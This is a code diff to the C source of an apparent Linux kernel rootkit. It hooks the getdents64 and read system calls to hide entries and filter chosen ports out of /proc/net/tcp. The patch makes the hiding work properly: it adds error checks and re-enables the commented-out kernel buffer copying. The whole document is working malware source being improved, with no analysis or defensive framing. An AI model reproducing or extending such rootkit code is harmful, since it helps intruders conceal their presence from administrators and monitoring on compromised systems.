@@ -151,6 +151,8 @@ asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp,
 
 	// run real getdents64 
 	result = (*orig_getdents64)(fd,dirp,count);
+	if (result < 0)
+		return result;
 
 	// copy from user to kernelspace;
 	if (!access_ok(VERIFY_READ,dirp,result))
@@ -195,7 +197,7 @@ asmlinkage long hacked_read(unsigned int fd, char __user *buf,
                            size_t count)
 {
 	long result, bp, diff_in_bytes;
-	char *start_line, *end_line, *port_num;
+	char *kbuf, *start_line, *end_line, *port_num;
 	char *pathname, pbuf[256];
 	struct files_struct *current_files; 
 	struct fdtable *files_table;
@@ -203,14 +205,16 @@ asmlinkage long hacked_read(unsigned int fd, char __user *buf,
 
 	// run real read 
 	result = (*orig_read)(fd,buf,count);
+	if (result < 0)
+		return result;
 
 	// copy from user to kernelspace;
-	//if (!access_ok(VERIFY_READ,buf,result))
-	//	return -1;
-	//if ((kbuf = kmalloc(result,GFP_KERNEL)) == NULL)
-	//	return -1;
-	//if (copy_from_user(kbuf,buf,result))
-	//	return -1;
+	if (!access_ok(VERIFY_READ,buf,result))
+		return -1;
+	if ((kbuf = kmalloc(result,GFP_KERNEL)) == NULL)
+		return -1;
+	if (copy_from_user(kbuf,buf,result))
+		return -1;
 
 	// get pathname
 	current_files = current->files;
@@ -222,7 +226,7 @@ asmlinkage long hacked_read(unsigned int fd, char __user *buf,
 	// filter out hidden ports if /proc/net/tcp
 	if (!strncmp(pathname,"/proc/",6) && !strcmp(pathname+10,"/net/tcp")) {
 		for (bp = 0; bp < result;) {
-			start_line = buf + bp;
+			start_line = kbuf + bp;
 			port_num = strchr(strchr(start_line,':') + 1,':') + 1;
 			end_line = strchr(start_line,'\n');
 			diff_in_bytes = ((end_line + 1) - start_line) * sizeof(char);
@@ -237,11 +241,11 @@ asmlinkage long hacked_read(unsigned int fd, char __user *buf,
 	}
 
 	// copy from kernel to userspace
-	//if (!access_ok(VERIFY_WRITE,buf,result))
-	//	return -1;
-	//if (copy_to_user(buf,kbuf,result))
-	//	return -1;
-	//kfree(kbuf);
+	if (!access_ok(VERIFY_WRITE,buf,result))
+		return -1;
+	if (copy_to_user(buf,kbuf,result))
+		return -1;
+	kfree(kbuf);
 
 	// return number of bytes read
 	return result;
